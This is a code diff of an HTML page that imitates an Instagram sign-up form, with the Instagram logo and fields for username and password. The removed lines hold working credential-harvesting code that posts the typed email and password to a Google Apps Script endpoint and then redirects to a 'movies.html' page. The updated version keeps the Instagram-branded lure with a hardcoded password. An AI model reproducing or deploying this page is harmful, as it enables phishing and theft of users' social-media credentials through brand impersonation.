@@ -6,17 +6,53 @@
 <title>Instagram Sign Up</title>
 
 <style>
-body{ margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:white; font-family:sans-serif;}
-.container{ width:90%; max-width:350px; text-align:center;}
-.logo{ width:80px; margin-bottom:20px;}
-input{ width:100%; padding:12px; margin:8px 0; border-radius:10px; border:1px solid #ccc;}
-button{ width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:10px; font-size:16px; cursor:pointer;}
-#errorMsg{color:red; font-size:14px; margin-top:5px;}
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:white;
+  font-family:sans-serif;
+}
+.container{
+  width:90%;
+  max-width:350px;
+  text-align:center;
+}
+.logo{
+  width:80px;
+  margin-bottom:20px;
+}
+input{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border-radius:10px;
+  border:1px solid #ccc;
+}
+button{
+  width:100%;
+  padding:12px;
+  background:#1877f2;
+  color:white;
+  border:none;
+  border-radius:10px;
+  font-size:16px;
+  cursor:pointer;
+}
+#errorMsg{
+  color:red;
+  font-size:14px;
+  margin-top:5px;
+}
 </style>
+
 </head>
 <body>
 
 <div class="container">
+
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
 
   <input id="instaUser" placeholder="Nom de profil, e-mail ou numéro">
@@ -24,31 +60,21 @@ button{ width:100%; padding:12px; background:#1877f2; color:white; border:none; 
 
   <button onclick="go()">Sign Up</button>
   <div id="errorMsg"></div>
+
 </div>
 
 <script>
-const correctPassword = "1234";
+let attempts = 0;
 const maxAttempts = 3;
-const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
+const correctPassword = "1234"; // ضع كلمة السر هنا
 
-function go(){
-  const email = document.getElementById("instaUser").value;
+function go() {
   const pw = document.getElementById("instaPass").value;
   const error = document.getElementById("errorMsg");
-
-  let attempts = parseInt(localStorage.getItem("insta_attempts") || "0");
   attempts++;
-  localStorage.setItem("insta_attempts", attempts);
 
-  if(pw === correctPassword || attempts >= maxAttempts){
-    fetch(sheetUrl, {
-      method: "POST",
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=NA&form=Instagram`
-    }).then(()=>{
-      localStorage.removeItem("insta_attempts");
-      window.location.href="movies.html";
-    });
+  if(pw === correctPassword || attempts === maxAttempts){
+    window.location.href = "movies.html"; // الدخول للسيت
   } else {
     error.innerText = "Password incorrect";
   }
